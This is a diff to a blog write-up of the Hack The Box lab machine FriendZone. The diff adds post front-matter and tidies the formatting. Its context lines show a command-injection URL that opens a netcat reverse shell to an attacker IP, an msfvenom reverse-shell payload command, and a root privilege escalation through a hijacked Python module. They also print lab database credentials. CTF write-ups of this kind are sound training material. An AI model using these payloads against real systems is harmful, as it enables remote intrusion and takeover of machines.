@@ -1,4 +1,11 @@
-# FriendZone HTB
+---
+layout: post
+title: "HTB: FriendZone"
+date: 2022-08-10 18:07 +0100
+tags: hackthebox htb windows hacking pentesting dns python
+categories: [Pentesting, HackTheBox]
+published: false
+---
 
 ## Scanning
 
@@ -450,11 +457,11 @@ user:a9ed20acecd6c5b6b52f474e15ae9a11
 
 `https://administrator1.friendzone.red//dashboard.php?image_id=a.jpg&cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.3+1223+>/tmp/f&pagename=/etc/Development/backdoor`
 
-Once we're on the box we can 
+Once we're on the box we can do the following:
 
-`friend:x:1000:1000:friend,,,:/home/friend:/bin/bash`
+`friend:x:1000:1000:friend,,,:/home/friend:/bin/bash` (wtf is this?)
 
-```
+```bash
 www-data@FriendZone:/var/www$ cat mysql_data.conf
 cat mysql_data.conf
 for development process this is the mysql creds for user friend
@@ -466,22 +473,21 @@ db_pass=Agpyu12!0.213$
 db_name=FZ
 ```
 
-Used those credentials to log in via SSH. 
+Used those credentials to log in via SSH.
 
 First we used [PsPy](https://github.com/DominicBreuker/pspy) to watch the processes that run as root
 
 Spotted a python file being ran on a timer
 
-Found that it imported the "os" module, and that the os.py module file was writable. 
+Found that it imported the "os" module, and that the os.py module file was writable.
 
-```
+```python
 import subprocess
 subprocess.check_output(["/tmp/beeeep/iwconfig"])
 ```
 
-"iwconfig" in this case is actually the following: 
+"iwconfig" in this case is actually the following:
 
 `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=1337 -f elf > iwconfig`
 
 Initially we thought that there was a way to get through via MySQL. But that was just a rabbit hole.
-
